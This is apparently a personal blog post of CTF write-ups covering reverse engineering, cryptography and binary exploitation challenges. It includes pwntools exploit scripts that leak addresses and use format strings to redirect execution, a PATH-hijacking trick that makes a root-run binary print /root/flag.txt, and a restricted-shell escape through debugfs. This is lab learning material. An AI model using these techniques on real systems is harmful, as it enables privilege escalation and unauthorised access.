---
title: "Binary Exploitation Writeup - Sacred Scrolls: Revenge"
published: false
date: 2025-02-25 00:00:00 +/-0000
categories: [general,ctf]
tags: [ctf,htb,binexp,binary exploitation,reverse engineering]     # TAG names should always be lowercase
image:
    path: /assets/images/malware.jpg
---

# Reverse Engineering

## Flag Hunters

This was a neat little challenge that rested on Python comprehension.

* The `lyric-reader.py` file reads the flag in and appends it as a hidden verse at the start of the song.
* It's possible to de-synch the `lip` count through the use of semi-colons
* By making use of the `r"RETURN [0-9]+"` regex match, we can redirect the song to print out the flag.
* The exploit I used was `;RETURN 0`.

```python
import re
import time


# Read in flag from file
flag = open('flag.txt', 'r').read()

secret_intro = \
'''Pico warriors rising, puzzles laid bare,
Solving each challenge with precision and flair.
With unity and skill, flags we deliver,
The ether’s ours to conquer, '''\
+ flag + '\n'


song_flag_hunters = secret_intro +\
'''

[REFRAIN]
We’re flag hunters in the ether, lighting up the grid,
No puzzle too dark, no challenge too hid.
With every exploit we trigger, every byte we decrypt,
We’re chasing that victory, and we’ll never quit.
CROWD (Singalong here!);
RETURN

[VERSE1]
Command line wizards, we’re starting it right,
Spawning shells in the terminal, hacking all night.
Scripts and searches, grep through the void,
Every keystroke, we're a cypher's envoy.
Brute force the lock or craft that regex,
Flag on the horizon, what challenge is next?

REFRAIN;

Echoes in memory, packets in trace,
Digging through the remnants to uncover with haste.
Hex and headers, carving out clues,
Resurrect the hidden, it's forensics we choose.
Disk dumps and packet dumps, follow the trail,
Buried deep in the noise, but we will prevail.

REFRAIN;

Binary sorcerers, let’s tear it apart,
Disassemble the code to reveal the dark heart.
From opcode to logic, tracing each line,
Emulate and break it, this key will be mine.
Debugging the maze, and I see through the deceit,
Patch it up right, and watch the lock release.

REFRAIN;

Ciphertext tumbling, breaking the spin,
Feistel or AES, we’re destined to win.
Frequency, padding, primes on the run,
Vigenère, RSA, cracking them for fun.
Shift the letters, matrices fall,
Decrypt that flag and hear the ether call.

REFRAIN;

SQL injection, XSS flow,
Map the backend out, let the database show.
Inspecting each cookie, fiddler in the fight,
Capturing requests, push the payload just right.
HTML's secrets, backdoors unlocked,
In the world wide labyrinth, we’re never lost.

REFRAIN;

Stack's overflowing, breaking the chain,
ROP gadget wizardry, ride it to fame.
Heap spray in silence, memory's plight,
Race the condition, crash it just right.
Shellcode ready, smashing the frame,
Control the instruction, flags call my name.

REFRAIN;

END;
'''

MAX_LINES = 100

def reader(song, startLabel):
  lip = 0
  start = 0
  refrain = 0
  refrain_return = 0
  finished = False

  # Get list of lyric lines
  song_lines = song.splitlines()
  print(song_lines)
  
  # Find startLabel, refrain and refrain return
  for i in range(0, len(song_lines)):
    if song_lines[i] == startLabel:
      start = i + 1
    elif song_lines[i] == '[REFRAIN]':
      refrain = i + 1
    elif song_lines[i] == 'RETURN':
      refrain_return = i

  # Print lyrics
  line_count = 0
  lip = start
  while not finished and line_count < MAX_LINES:
    line_count += 1
    for line in song_lines[lip].split(';'):
      if line == '' and song_lines[lip] != '':
        continue
      if line == 'REFRAIN':
        song_lines[refrain_return] = 'RETURN ' + str(lip + 1)
        lip = refrain
      elif re.match(r"CROWD.*", line):
        crowd = input('Crowd: ')
        song_lines[lip] = 'Crowd: ' + crowd
        lip += 1
        print(song_lines)
      elif re.match(r"RETURN [0-9]+", line):
        lip = int(line.split()[1])
      elif line == 'END':
        finished = True
      else:
        print(line, flush=True)
        time.sleep(0.5)
        lip += 1
      print("LIP IS: ", lip)



reader(song_flag_hunters, '[VERSE1]')
```

## Tap Into Hash

* We're given a `enc_flag` file and a `block_chain.py` file
* Used chatGPT to solve; solution below:

```python
import hashlib  # Used to compute SHA-256 hashes for key expansion

def decrypt(ciphertext, key):
    """
    Decrypts the ciphertext using XOR with a SHA-256 hashed key.
    Assumes data was padded before encryption.
    """
    block_size = 16  # The encryption operates on 16-byte blocks
    key_hash = hashlib.sha256(key).digest()  # Hash the key to ensure it's a fixed length

    plaintext_padded = b''  # Placeholder for decrypted data

    # Decrypt each block using XOR
    for i in range(0, len(ciphertext), block_size):
        block = ciphertext[i:i + block_size]  # Extract block-sized chunk
        decrypted_block = xor_bytes(block, key_hash)  # XOR with hashed key
        plaintext_padded += decrypted_block  # Append to result

    return unpad(plaintext_padded)  # Remove padding and return plaintext


def xor_bytes(a, b):
    """
    Performs XOR operation between two byte sequences.
    Ensures that each byte of 'a' is XORed with the corresponding byte of 'b'.
    """
    return bytes(x ^ y for x, y in zip(a, b))


def unpad(padded_data):
    """
    Removes PKCS#7-style padding from decrypted data.
    Assumes the last byte indicates padding length.
    """
    padding_length = padded_data[-1]  # Read the last byte, which is the padding length
    return padded_data[:-padding_length].decode()  # Strip padding and convert to string


def read_input_file(filename):
    """
    Reads the key and encrypted blockchain data from a given file.
    Extracts bytes from strings formatted as "Key: b'...'" and "Encrypted Blockchain: b'...'".
    """
    with open(filename, 'r') as file:
        lines = file.readlines()  # Read all lines from the file

    # Find the lines that contain the key and encrypted blockchain data
    key_line = next(line for line in lines if line.startswith("Key: "))
    encrypted_line = next(line for line in lines if line.startswith("Encrypted Blockchain: "))

    # Extract the byte values from the formatted strings
    key = eval(key_line.split("Key: ")[1].strip())  # Convert "b'...'" string to actual bytes
    encrypted_blockchain = eval(encrypted_line.split("Encrypted Blockchain: ")[1].strip())  # Convert to bytes

    return key, encrypted_blockchain  # Return extracted values


def main():
    """
    Main function to read the input file, extract the key and encrypted blockchain,
    decrypt the blockchain, and print the decrypted output.
    """
    filename = "input.txt"  # Name of the file containing key and encrypted blockchain

    key, encrypted_blockchain = read_input_file(filename)  # Read data from file

    print("Using Key:", key)  # Print extracted key for verification
    decrypted_blockchain = decrypt(encrypted_blockchain, key)  # Perform decryption

    print("\nDecrypted Blockchain String:")  # Display the decrypted blockchain data
    print(decrypted_blockchain)


if __name__ == "__main__":
    main()  # Execute main function when script runs

```

## Quantum Scrambler

* We receive `quantum_scrambler.py`; connecting to the server receives the encoded version of the flag.
* The encoded output is a string representation of an array of arrays
* Looking at a test output shows a pattern we can exploit (input ABCDEFGHIJKLMNOP):

[['0x41'], ['0x42'], ['0x43'], ['0x44'], ['0x45'], ['0x46'], ['0x47'], ['0x48'], ['0x49'], ['0x4a'], ['0x4b'], ['0x4c'], ['0x4d'], ['0x4e'], ['0x4f'], ['0x50']]


['0x41', '0x42']
['0x43', [], '0x44']
['0x45', [['0x41', '0x42']], '0x46']
['0x47', [['0x41', '0x42'], ['0x43', [], '0x44']], '0x48']
['0x49', [['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']], '0x46']], '0x4a']
['0x4b', [['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']], '0x46'], ['0x47', [['0x41', '0x42'], ['0x43', [], '0x44']], '0x48']], '0x4c']
['0x4d', [['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']], '0x46'], ['0x47', [['0x41', '0x42'], ['0x43', [], '0x44']], '0x48'], ['0x49', [['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']], '0x46']], '0x4a']], '0x4e']
['0x4f', [['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']], '0x46'], ['0x47', [['0x41', '0x42'], ['0x43', [], '0x44']], '0x48'], ['0x49', [['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']], '0x46']], '0x4a'], ['0x4b', [['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']], '0x46'], ['0x47', [['0x41', '0x42'], ['0x43', [], '0x44']], '0x48']], '0x4c']]]
['0x50']

* We can see that we can ignore everything but the first and last bytes. The second to last array won't have a standalone last byte, as that gets left by itself as the last array.
* Ergo, we can just parse the array-of-arrays for these first/last bytes and get the flag. Solution below:

```python
import ast

def main():
  bytes = ''
  with open("tangled.txt", 'r') as f:
    line = f.read()
  data = ast.literal_eval(line)
  print(data)
  for _ in data:
    if (len(_) > 1):
      bytes += chr(int(_[0],16))
      if (len(_[-1]) == 4):
        bytes += chr(int(_[-1],16))
      print(_[0], _[-1], len(_[-1]))
    else:
      bytes += chr(int(_[0],16))
      print(_[0])
  print(bytes)

if __name__ == '__main__':
  main()

```

# Binary Exploitation

## PIE TIME

* Received `vuln` and `vuln.c`
* Checksec showed all things as active.
* Source code showed a memory leak, so it was trivial to traverse
* Solution shown below

```python
#!/usr/bin/env python3
import sys

from pwn import *

context.update(arch='amd64', os='linux')

elf = context.binary = ELF('./vuln')

#binstr = "./perplexed"
address_port_str = "rescued-float.picoctf.net:50332"
ip, port_str = address_port_str.split(":")
port = int(port_str)

#    break *0x56555d36
if (len(sys.argv)<= 1):
    p = process()
elif (sys.argv[1] == "dbg"):
    p = gdb.debug([binstr],'''
    unset env LINES
    unset env COLUMNS
    break *0x401211
    continue
    ''')
elif (sys.argv[1] == "remote"):
    p = remote(ip,port)
else:
    print(f"Invalid argument to e.py: '{sys.argv[1]}'. Did you mean 'dbg'?")
    sys.exit(1)

p.recvuntil('main: ')
main = int(p.recvline(),16)
print("RECEIVED: ", main)
elf.address = main - elf.sym['main']
payload = elf.sym['win']
payload = hex(payload)

print(type(payload),payload)

p.sendline(payload)

p.interactive()

```

## hash-only-1

* Receive a `flaghasher` binary
* There's not really anything to overflow, and checksec shows a lot of strong controls in place
* Vulnerability rests in pathing; the binary constructs the following system call: `/bin/bash -c 'md5sum /root/flag.txt`
  * We override the path to have `md5sum` point to a different binary (like `cat`)
  * `ln -s /usr/bin/cat md5sum`
* After SSH-ing into the remote instance:
  * `echo 'export PATH="/home/ctf-player:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"' >> ~/.bashrc`
  * `source ~/.bashrc`
* Then we run the binary
* Code below is the decompiled binary C++ code with comments

```c
#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <string>

bool main(void)
{
    // Pointers for output stream objects
    std::basic_ostream<> *pbVar1;
    std::basic_ostream<> *pbVar2;
    
    // Command to be executed
    char *__command;
    
    // Stack protection variable (used for detecting stack smashing)
    long in_FS_OFFSET;
    long local_20;
    
    // Boolean flag for checking system call success
    bool bVar3;

    // Local variables for handling string allocation
    std::allocator<char> local_4d;
    int local_4c;
    std::basic_string<> local_48[40];  // Buffer to store the command string

    // Store the current stack canary value (used for stack protection)
    local_20 = *(long *)(in_FS_OFFSET + 0x28);

    // Print message to stdout: "Computing the MD5 hash of /root/flag.txt...."
    pbVar1 = std::operator<<((std::basic_ostream *)std::cout, "Computing the MD5 hash of /root/flag.txt.... ");
    pbVar2 = (std::basic_ostream<> *)std::basic_ostream<>::operator<<((std::basic_ostream<> *)pbVar1, std::endl<>);
    std::basic_ostream<>::operator<<(pbVar2, std::endl<>);

    // Pause execution for 2 seconds
    sleep(2);

    // Initialize a string allocator (not strictly needed in modern C++)
    std::allocator<char>::allocator();
    
    // Construct the command string: "/bin/bash -c 'md5sum /root/flag.txt'"
    std::__cxx11::basic_string<>::basic_string((char *)local_48, (std::allocator<char> *)"/bin/bash -c 'md5sum /root/flag.txt'");
    
    // Destructor for the string allocator
    std::allocator<char>::~allocator(&local_4d);

    // **Privilege Escalation**: Set the process to run as root (DANGEROUS)
    setgid(0);  // Set group ID to 0 (root)
    setuid(0);  // Set user ID to 0 (root)

    // Get a pointer to the command string
    __command = (char *)std::__cxx11::basic_string<>::c_str();

    // Execute the command using system()
    local_4c = system(__command);

    // Check if system() execution failed (non-zero return value)
    bVar3 = local_4c != 0;
    if (bVar3) {
        // Print an error message to stderr if system() failed
        pbVar1 = std::operator<<((std::basic_ostream *)std::cerr, "Error: system() call returned non-zero value: ");
        pbVar2 = (std::basic_ostream<> *)std::basic_ostream<>::operator<<((std::basic_ostream<> *)pbVar1, local_4c);
        std::basic_ostream<>::operator<<(pbVar2, std::endl<>());
    }

    // Destructor for the command string
    std::__cxx11::basic_string<>::~basic_string(local_48);

    // Stack Canary Check: Ensure the stack was not corrupted
    if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
        return bVar3;  // Return whether the system() call succeeded
    }

    // Stack protection failure: Terminate program if canary check fails
    __stack_chk_fail();
}
```

## hash-only-2

* Same as `hash-only-1`, but with just some overhead prep
* Logging in drops us into a restricted shell `/bin/rbash`
  * The restricted shell doesn't allow us to redirect (`>`, change the `$PATH`, or configure `.bashrc`).
* Looking over our available binaries, we can execute a number of binaries residing in `/usr/sbin`
  * Among them is `debugfs`, which GTFObins shows as allowing us to spawn a shell.
* `debugfs`
  * `!/bin/bash`
* After dropping into this shell, we replicate the steps from `hash-only-1` to attain flag

## PIE TIME 2

* This challenge gives the source code in `vuln.c`.
  * Unlike `PIE TIME`, this challenge prompts for a username and echoes it back before prompting for an address.
* The vulnerability rests in its use of format strings
  * I referenced this to help: https://7rocky.github.io/en/ctf/htb-challenges/pwn/format/
  * Below was my script for enumerating addresses

```python
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('vn')

address_port_str = "rescued-float.picoctf.net:49678"
ip, port_str = address_port_str.split(":")
port = int(port_str)

def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    #host, port = sys.argv[1].split(':')
    return remote(ip, port)


def main():
    context.log_level = 'CRITICAL'

    for i in range(75):
        p = get_process()
        p.sendline(f'%{i + 1}$lx'.encode())
        #print(p.recv())
        print(i + 1, p.recvuntil("\n").decode().strip().split(":")[1])


if __name__ == '__main__':
    main()

```

* The above script would output offsets with addresses. Using the earlier reference, I could find addresses within the binary beginning with `0x55..`
  * I could test a few in `gdb` to see where they resided, eventually finding one along 23 that landed in `main()`.
* This lead to an issue/discrepancy, because - for reasons that I wasn't clear on - the address offsets in the local binary did not align to the remote instance.
  * Using the above script against the remote instance yielded more addresses to compare against.
  * I figured the address would be close, and I found one not too far that worked.
* Final exploit below:

```python
#!/usr/bin/env python3
import sys

from pwn import *

context.update(arch='amd64', os='linux')

elf = context.binary = ELF('./vn')

#binstr = "./perplexed"
address_port_str = "rescued-float.picoctf.net:49678"
ip, port_str = address_port_str.split(":")
port = int(port_str)

#    break *0x56555d36
if (len(sys.argv)<= 1):
    p = process()
elif (sys.argv[1] == "dbg"):
    p = gdb.debug(['./vn'],'''
    unset env LINES
    unset env COLUMNS
    break call_functions
    continue
    ''')
elif (sys.argv[1] == "remote"):
    p = remote(ip,port)
else:
    print(f"Invalid argument to e.py: '{sys.argv[1]}'. Did you mean 'dbg'?")
    sys.exit(1)
'''
payload = b'AAAAAAAAAAAA %47$p'
p.sendline(payload)
p.recvuntil("AA ")
offset = int(p.recvline(),16)
main = offset + 0x240
elf.address = main - elf.sym['main']
x = elf.sym['win']
x = hex(x)
p.sendline(x)
'''

payload = b'AAAAAAAAAAAA %25$p'
p.sendline(payload)
p.recvuntil("AA ")
main = int(p.recvline(),16)
elf.address = main - elf.sym['main']
x = elf.sym['win']
x = hex(x)
p.sendline(x)

p.interactive()
```

# Cryptography

## hashcrack

* Hashes can all be cracked using crackstation
  * password123
  * letmein
  * qwerty098

```
482c811da5d5b4bc6d497ffa98491e38
b7a875fc1ea228b9061041b7cec4bd3c52ab3ce3
916e8c4f79b25028c9e467f1eb8eee6d6bbdff965f9928310ad30a8d88697745
```